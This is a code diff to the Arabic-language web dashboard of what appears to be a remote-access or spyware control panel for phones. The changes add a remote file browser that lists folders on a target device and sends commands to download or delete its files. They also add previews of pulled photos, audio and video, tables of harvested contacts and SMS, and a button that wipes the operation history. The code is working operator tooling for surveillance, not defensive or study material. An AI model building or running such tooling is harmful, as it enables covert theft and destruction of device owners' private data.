@@ -39,6 +39,7 @@
     <option value="">— اختر الجهاز —</option>
   </select>
   <button class="blue" onclick="loadDevices()">🔄 تحديث الأجهزة</button>
+  <button onclick="clearHistory()">🧹 مسح السجل</button>
   <button class="red" onclick="logout()">🚪 خروج</button>
 </div>
 
@@ -199,7 +200,8 @@ function render(h) {
     (h.fname ? ' · ' + esc(h.fname) : '') +
     (h.size ? ' · ' + fmt(h.size) : '');
 
-  if (h.file) {
+  // ① نتيجة ملف (صورة/صوت/فيديو/أي ملف): رابط تنزيل + معاينة — تعمل حتى للملفات الصغيرة
+  if (h.fname) {
     const url = '/api/file/' + encodeURIComponent(h.cmdId);
     const ext = (h.fname || '').split('.').pop().toLowerCase();
     html += '<br><a href="' + url + '" download>⬇️ تنزيل الملف</a>';
@@ -212,7 +214,30 @@ function render(h) {
   } else if (h.data) {
     try {
       const d = JSON.parse(h.data);
-      if (Array.isArray(d) && d.length && typeof d[0] === 'object') {
+
+      // ② مستكشف الملفات: مجلدات وملفات مع أزرار فتح/تنزيل/حذف
+      if (d && Array.isArray(d.items)) {
+        const cur = esc(d.path || '');
+        const par = esc(d.parent || '');
+        html += '<br><b>📁 المسار الحالي:</b> ' + cur;
+        html += '<br><button onclick="sendCmd(\'files\',{path:\'' + cur + '\'})">🔄 تحديث</button>';
+        if (par) html += ' <button class="blue" onclick="sendCmd(\'files\',{path:\'' + par + '\'})">⬆️ المجلد الأب</button>';
+        html += '<table><tr><th>الاسم</th><th>الحجم</th><th>التاريخ</th><th>إجراءات</th></tr>';
+        (d.items || []).forEach(o => {
+          const p = esc(o.path || '');
+          html += '<tr><td>' + (o.dir ? '📁 ' : '📄 ') + esc(o.name) + '</td><td>' + (o.dir ? '—' : fmt(o.size)) + '</td><td>' + new Date(o.time || 0).toLocaleString('ar') + '</td><td>';
+          if (o.dir) {
+            html += '<button onclick="sendCmd(\'files\',{path:\'' + p + '\'})">📂 فتح</button>';
+          } else {
+            html += '<button onclick="sendCmd(\'get_file\',{path:\'' + p + '\'})">⬇️</button> ';
+            html += '<button class="red" onclick="sendCmd(\'delete_file\',{path:\'' + p + '\'})">🗑</button>';
+          }
+          html += '</td></tr>';
+        });
+        html += '</table>';
+
+      // ③ جدول بيانات (جهات اتصال، SMS، صور، فيديوهات...) مع أزرار
+      } else if (Array.isArray(d) && d.length && typeof d[0] === 'object') {
         rowActs = [];
         html += '<table><tr><th>#</th>' + Object.keys(d[0]).map(k => '<th>' + esc(k) + '</th>').join('') + '<th>إجراءات</th></tr>';
         d.slice(0, 500).forEach((o, i) => {
@@ -233,6 +258,8 @@ function render(h) {
           html += '<td>' + btns + '</td></tr>';
         });
         html += '</table>';
+
+      // ④ كائن بسيط: جدول مفتاح/قيمة
       } else if (typeof d === 'object' && d !== null) {
         html += '<table>' + Object.entries(d).map(([k, v]) =>
           '<tr><td><b>' + esc(k) + '</b></td><td>' + esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</td></tr>'
@@ -262,6 +289,11 @@ async function pollResults() {
       }
     }
   } catch (e) { /* تجاهل */ }
+}
+
+async function clearHistory() {
+  if (!confirm('مسح كل سجل العمليات؟')) return;
+  try { await api('/api/clear', {}); log('🧹 تم مسح السجل'); } catch (e) { log('❌ ' + e.message); }
 }
 
 function logout() {
